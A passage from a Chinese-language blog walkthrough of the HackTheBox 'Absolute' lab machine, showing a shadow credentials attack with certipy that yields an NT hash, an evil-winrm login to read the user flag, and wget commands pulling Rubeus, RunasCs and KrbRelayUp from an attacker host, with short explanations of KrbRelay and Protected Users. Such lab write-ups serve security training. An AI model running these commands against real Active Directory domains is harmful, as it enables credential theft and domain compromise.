+<p>之后要重新添加ACL</p>
+<p>现在可以对WINRM_USER进行影子凭据攻击，上次用的是pywhisker，这次用certipy。</p>
+<blockquote>
+<p><strong>原理</strong>：影子凭据（Shadow Credentials）攻击利用了用户&#x2F;计算机对象的 <code>msDS-KeyCredentialLink</code> 属性——它本用于 Windows Hello for Business，存放账户的公钥凭据。当我们对目标拥有 <code>GenericWrite</code> 等写权限时，可以往该属性写入自己生成的一对证书公钥；随后用对应私钥通过 PKINIT 向 KDC 请求 TGT，即可”以目标身份”认证，并进一步 U2U 解出其 NT hash。相比改密码，它不会锁死原用户、且用完可还原，隐蔽性更好。<code>certipy shadow auto</code> 把”生成证书→写入→PKINIT→取回 NT hash→还原属性”整条流程自动化了。</p>
+</blockquote>
+<p>注意要重新申请票据。</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!                                                                                                  </span><br>Impacket v<span class="hljs-number">0.14</span><span class="hljs-number">.0</span>.dev0 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies <br><br>[*] Saving ticket in m.lovegod.ccache<br>                                                                                                                                                                                                                  <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># export KRB5CCNAME=m.lovegod.ccache</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.60</span> -target dc.absolute.htb -account winrm_user<br><span class="hljs-symbol">Certipy</span> v4<span class="hljs-number">.8</span><span class="hljs-number">.2</span> - by <span class="hljs-symbol">Oliver</span> <span class="hljs-symbol">Lyak</span> (ly4k)<br><br>[*] <span class="hljs-symbol">Targeting</span> user <span class="hljs-string">&#x27;winrm_user&#x27;</span><br>[*] <span class="hljs-symbol">Generating</span> certificate<br>[*] <span class="hljs-symbol">Certificate</span> generated<br>[*] <span class="hljs-symbol">Generating</span> <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span><br>[*] <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> generated with <span class="hljs-symbol">DeviceID</span> <span class="hljs-string">&#x27;7e08e40c-a63d-581a-d968-c5c1acfff30f&#x27;</span><br>[*] <span class="hljs-symbol">Adding</span> <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> with device <span class="hljs-symbol">ID</span> <span class="hljs-string">&#x27;7e08e40c-a63d-581a-d968-c5c1acfff30f&#x27;</span> to the <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;winrm_user&#x27;</span><br>[*] <span class="hljs-symbol">Successfully</span> added <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> with device <span class="hljs-symbol">ID</span> <span class="hljs-string">&#x27;7e08e40c-a63d-581a-d968-c5c1acfff30f&#x27;</span> to the <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;winrm_user&#x27;</span><br>[*] <span class="hljs-symbol">Authenticating</span> as <span class="hljs-string">&#x27;winrm_user&#x27;</span> with the certificate<br>[*] <span class="hljs-symbol">Using</span> principal: winrm_user@absolute.htb<br>[*] <span class="hljs-symbol">Trying</span> to get <span class="hljs-symbol">TGT</span>...<br>[*] <span class="hljs-symbol">Got</span> <span class="hljs-symbol">TGT</span><br>[*] <span class="hljs-symbol">Saved</span> credential cache to <span class="hljs-string">&#x27;winrm_user.ccache&#x27;</span><br>[*] <span class="hljs-symbol">Trying</span> to retrieve <span class="hljs-symbol">NT</span> hash for <span class="hljs-string">&#x27;winrm_user&#x27;</span><br>[*] <span class="hljs-symbol">Restoring</span> the old <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;winrm_user&#x27;</span><br>[*] <span class="hljs-symbol">Successfully</span> restored the old <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;winrm_user&#x27;</span><br>[*] <span class="hljs-symbol">NT</span> hash for <span class="hljs-string">&#x27;winrm_user&#x27;</span>: <span class="hljs-number">8738</span>c7413a5da3bc1d083efc0ab06cb2<br><br></code></pre></td></tr></table></figure>
+
+<p>现在导入票据拿到userflag</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# export KRB5CCNAME=winrm_user.ccache <br>                                                                                                                                                                                                                  <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# evil-winrm -i dc.absolute.htb -r absolute.htb<br>                                        <br>Evil-WinRM shell v3.<span class="hljs-number">9</span> <br>                                        <br>Warning: Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: undefined <span class="hljs-keyword">method</span> `<span class="hljs-title function_">quoting_detection_proc</span>&#x27; <span class="hljs-title function_">for</span> <span class="hljs-title function_">module</span> <span class="hljs-title function_">Reline</span> <br>                                        <br><span class="hljs-title function_">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion </span><br>                                        <br>Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint <br>*Evil-WinRM* PS C:\Users\winrm_user\Documents&gt; <span class="hljs-keyword">type</span> ../desktop/user.txt<br>aae8026a71044cb222d3a655f875b184<br>*Evil-WinRM* PS C:\Users\winrm_user\Documents&gt; <br><br></code></pre></td></tr></table></figure>
+
+<p>提权方面，这里用的是一种当时非常新的技术KrbRelay</p>
+<blockquote>
+<p><strong>原理</strong>：KrbRelay&#x2F;KrbRelayUp 的核心是把 Kerberos 认证做<strong>中继</strong>。它诱导本机的 SYSTEM 上下文向攻击者控制的入口发起 Kerberos 认证，再把这张服务票据中继到 LDAP&#x2F;SCM 等本地服务，进而配置基于资源的受限委派（RBCD）或直接创建高权限服务，最终在本机取得 SYSTEM。它填补了当年”本地无 NTLM 中继可用”场景下的提权空白。</p>
+</blockquote>
+<p>使用工具KrbRelayUp</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\users\public&gt; <span class="hljs-built_in">wget</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">15.116</span>/Rubeus.exe <span class="hljs-literal">-o</span> Rubeus.exe<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\users\public&gt; <span class="hljs-built_in">wget</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">15.116</span>/RunasCs.exe <span class="hljs-literal">-o</span> RunasCs.exe<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\users\public&gt; <span class="hljs-built_in">wget</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">15.116</span>/KrbRelayUp.exe <span class="hljs-literal">-o</span> KrbRelayUp.exe<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\users\public&gt; <br><br></code></pre></td></tr></table></figure>
+
+<p>但是由于我们所处的用户都在受保护的用户中（NTLM认证的原因），所以我们不能直接使用它来获得一个shell。</p>
+<blockquote>
+<p><strong>原理</strong>：”受保护的用户”（Protected Users）组会对成员强制施加更严格的安全策略：禁用 NTLM 认证、禁止 DES&#x2F;RC4 等弱加密、禁止无约束&#x2F;受约束委派、且 TGT 生命周期被缩短。这正是本靶机一路强制走 Kerberos 的根源，也意味着 KrbRelayUp 默认流程里依赖 NTLM&#x2F;RC4 的环节无法直接套用，需要针对性调整。</p>
+</blockquote>
+<p>这里在[HackTheBox Absolute <a target="_blank" rel="noopener" href="https://fdlucifer.github.io/2023/05/29/htb-absolute/#KrbRelayUp">AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay] | 0xfd’s blog</a>的文章中已经说的非常详细了，在此就不献丑了。</p>
+<p>总体来说前面考察的基本功还是挺多的，是台不错的靶机。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HTB/" class="print-no-link">#HTB</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Absolute</div>
+      <div>http://example.com/2026/09/02/HackTheBox-Absolute/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>September 2, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/09/17/OSCP-Challenge-7-Zeus/" title="OSCP-Challenge-7-Zeus">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OSCP-Challenge-7-Zeus</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/06/27/OSCP-Challenge-6-OSCP-C/" title="OSCP-Challenge-6-OSCP-C">
+                        <span class="hidden-mobile">OSCP-Challenge-6-OSCP-C</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/random-slogan.js"></script>
+<script src="/js/ga-widget.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
